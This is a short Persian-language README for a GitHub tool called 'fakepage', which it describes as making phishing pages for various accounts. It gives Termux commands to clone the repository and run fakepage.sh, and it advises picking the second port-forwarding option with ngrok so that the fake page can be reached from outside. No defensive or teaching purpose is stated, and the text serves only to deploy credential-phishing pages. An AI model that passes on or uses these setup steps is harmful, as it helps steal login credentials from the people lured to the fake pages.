# fakepage
make fake page - ساخت صفحه فیشینگ اکانت های مختلف
دستور اجرا در ترموکس:

apt update


apt upgrade


git clone https://github.com/HACKGM/fakepage


cd fakepage


bash fakepage.sh

بهتره برای پورت فراوردینگ گزینه 2 رو انتخاب کنید 
موقع اتصال به 
ngrok
